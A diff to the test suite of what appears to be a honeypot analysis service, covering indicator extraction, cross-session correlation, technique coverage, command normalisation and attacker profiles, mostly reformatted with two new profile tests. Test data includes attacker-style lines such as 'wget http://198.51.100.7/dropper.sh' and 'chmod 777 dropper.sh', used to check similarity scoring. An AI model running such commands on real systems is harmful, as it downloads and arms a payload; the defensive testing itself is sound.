@@ -17,6 +17,7 @@ from app.db.models import Indicator as IndicatorRow
 from app.config import get_settings
 from app.db.session import get_session_factory
 from app.seed.seeder import seed
+from app.services import profiles
 from app.services.analyzer import run_analysis
 from app.services.compaction import compact
 from app.services.coverage import build_coverage
@@ -152,9 +153,7 @@ async def test_extraction_finds_urls_hashes_and_ips() -> None:
 
     assert len(compacted.downloads) == 1
     download = compacted.downloads[0]
-    assert download.shasum == (
-        "9f2b1c4e8a7d6053f1e2b9c8a7d6e5f4b3a2918077665544332211aabbccddee"
-    )
+    assert download.shasum == ("9f2b1c4e8a7d6053f1e2b9c8a7d6e5f4b3a2918077665544332211aabbccddee")
 
     hash_entry = next(
         (p, c) for p, c in extracted if p["type"] == "hash" and p["value"] == download.shasum
@@ -196,10 +195,12 @@ async def test_one_analysis_leaves_indicators_observed_with_one_session() -> Non
     # correlation: `source` starts (and stays, absent a second session)
     # OBSERVED, with exactly the one session id that was actually offered.
     value = f"203.0.113.{uuid.uuid4().int % 250}"
-    extracted = [(
-        {"type": "ip", "value": value},
-        [EvidenceCitation(event_id="e-1", artifact=f"connection from {value}")],
-    )]
+    extracted = [
+        (
+            {"type": "ip", "value": value},
+            [EvidenceCitation(event_id="e-1", artifact=f"connection from {value}")],
+        )
+    ]
     session_a = f"test-corr-a-{uuid.uuid4().hex[:8]}"
     try:
         new_count = await correlate(session_a, extracted)
@@ -221,10 +222,12 @@ async def test_reanalyzing_the_same_session_does_not_fabricate_correlation() -> 
     # something that never happened -- the same defect class as a
     # hardcoded risk level, just for a different field.
     value = f"203.0.113.{uuid.uuid4().int % 250}"
-    extracted = [(
-        {"type": "ip", "value": value},
-        [EvidenceCitation(event_id="e-1", artifact=f"connection from {value}")],
-    )]
+    extracted = [
+        (
+            {"type": "ip", "value": value},
+            [EvidenceCitation(event_id="e-1", artifact=f"connection from {value}")],
+        )
+    ]
     session_a = f"test-corr-a-{uuid.uuid4().hex[:8]}"
     try:
         await correlate(session_a, extracted)
@@ -251,10 +254,12 @@ async def test_indicator_flips_to_correlated_when_seen_in_a_second_session() -> 
     # it must stay OBSERVED even while the shared value next to it flips.
     shared_value = f"203.0.113.{uuid.uuid4().int % 250}"
     unique_value = f"198.51.100.{uuid.uuid4().int % 250}"
-    shared = [(
-        {"type": "ip", "value": shared_value},
-        [EvidenceCitation(event_id="e-1", artifact=f"connection from {shared_value}")],
-    )]
+    shared = [
+        (
+            {"type": "ip", "value": shared_value},
+            [EvidenceCitation(event_id="e-1", artifact=f"connection from {shared_value}")],
+        )
+    ]
     session_a = f"test-corr-a-{uuid.uuid4().hex[:8]}"
     session_b = f"test-corr-b-{uuid.uuid4().hex[:8]}"
     try:
@@ -266,10 +271,12 @@ async def test_indicator_flips_to_correlated_when_seen_in_a_second_session() -> 
         assert indicators[0].source == "OBSERVED"
         assert indicators[0].session_ids == [session_a]
 
-        session_b_extracted = shared + [(
-            {"type": "ip", "value": unique_value},
-            [EvidenceCitation(event_id="e-2", artifact=f"connection from {unique_value}")],
-        )]
+        session_b_extracted = shared + [
+            (
+                {"type": "ip", "value": unique_value},
+                [EvidenceCitation(event_id="e-2", artifact=f"connection from {unique_value}")],
+            )
+        ]
         new_count_again = await correlate(session_b, session_b_extracted)
         assert new_count_again == 1, "only unique_value is genuinely new this call"
 
@@ -357,9 +364,7 @@ async def test_coverage_marks_llm_inferred_technique_as_not_observed() -> None:
             mappings = (
                 (
                     await db.execute(
-                        select(TechniqueMapping).where(
-                            TechniqueMapping.analysis_id == analysis_id
-                        )
+                        select(TechniqueMapping).where(TechniqueMapping.analysis_id == analysis_id)
                     )
                 )
                 .scalars()
@@ -430,9 +435,7 @@ def test_normalisation_collapses_whitespace_and_case() -> None:
 
 
 def test_normalisation_ignores_a_differing_file_hash() -> None:
-    assert normalize_command("sha256sum " + "a" * 64) == normalize_command(
-        "sha256sum " + "b" * 64
-    )
+    assert normalize_command("sha256sum " + "a" * 64) == normalize_command("sha256sum " + "b" * 64)
 
 
 def test_normalisation_preserves_arguments_that_change_meaning() -> None:
@@ -448,8 +451,7 @@ def test_jaccard_scores_two_runs_of_one_campaign_as_identical_after_normalisatio
         for c in ("wget http://198.51.100.7/dropper.sh", "chmod 777 dropper.sh")
     }
     second = {
-        normalize_command(c)
-        for c in ("wget http://203.0.113.9/dropper.sh", "chmod 777 dropper.sh")
+        normalize_command(c) for c in ("wget http://203.0.113.9/dropper.sh", "chmod 777 dropper.sh")
     }
 
     assert jaccard(first, second) == 1.0
@@ -517,6 +519,37 @@ async def test_a_generous_cap_leaves_the_seed_corpus_complete(
     assert profile is not None
     assert profile.similarity_complete is True
     assert profile.similarity_incomplete_reason is None
+
+
+@pytest.mark.asyncio
+async def test_similarity_is_withheld_when_there_are_more_attackers_than_the_cap(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    await seed(reset=True)
+    monkeypatch.setattr(get_settings(), "attacker_ip_cardinality_limit", 1)
+
+    profile = await build_profile("185.220.101.44")
+
+    assert profile is not None
+    assert profile.similarity_complete is False
+    assert profile.similarity_incomplete_reason == "attacker_cardinality_limit"
+
+
+@pytest.mark.asyncio
+async def test_paging_the_pairs_gives_the_same_command_sets(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    # Small pages force many round trips through `after_key` (the shared index
+    # holds the live honeypot's pairs too); the sets must equal big pages'.
+    await seed(reset=True)
+    monkeypatch.setattr(profiles, "_PAIR_PAGE", 60_000)
+    whole, whole_reason = await profiles._commands_by_ip()
+    monkeypatch.setattr(profiles, "_PAIR_PAGE", 5_000)
+    paged, paged_reason = await profiles._commands_by_ip()
+
+    assert paged_reason == whole_reason
+    assert paged == whole
+    assert "185.220.101.44" in paged
 
 
 @pytest.mark.asyncio
@@ -607,10 +640,12 @@ async def test_concurrent_correlation_of_a_shared_value_does_not_raise() -> None
     import asyncio
 
     value = f"198.51.100.{uuid.uuid4().int % 250}"
-    extracted = [(
-        {"type": "ip", "value": value},
-        [EvidenceCitation(event_id="e-1", artifact=f"connection from {value}")],
-    )]
+    extracted = [
+        (
+            {"type": "ip", "value": value},
+            [EvidenceCitation(event_id="e-1", artifact=f"connection from {value}")],
+        )
+    ]
     session_a = f"test-race-a-{uuid.uuid4().hex[:8]}"
     session_b = f"test-race-b-{uuid.uuid4().hex[:8]}"
     try:
@@ -643,16 +678,16 @@ async def test_concurrent_correlation_still_reports_the_value_as_correlated() ->
     import asyncio
 
     value = f"198.51.100.{uuid.uuid4().int % 250}-{uuid.uuid4().hex[:6]}"
-    extracted = [(
-        {"type": "url", "value": f"http://{value}/x.sh"},
-        [EvidenceCitation(event_id="e-1", artifact="wget")],
-    )]
+    extracted = [
+        (
+            {"type": "url", "value": f"http://{value}/x.sh"},
+            [EvidenceCitation(event_id="e-1", artifact="wget")],
+        )
+    ]
     session_a = f"test-flip-a-{uuid.uuid4().hex[:8]}"
     session_b = f"test-flip-b-{uuid.uuid4().hex[:8]}"
     try:
-        await asyncio.gather(
-            correlate(session_a, extracted), correlate(session_b, extracted)
-        )
+        await asyncio.gather(correlate(session_a, extracted), correlate(session_b, extracted))
 
         indicators = await list_indicators(type_="url", q=value)
         assert len(indicators) == 1
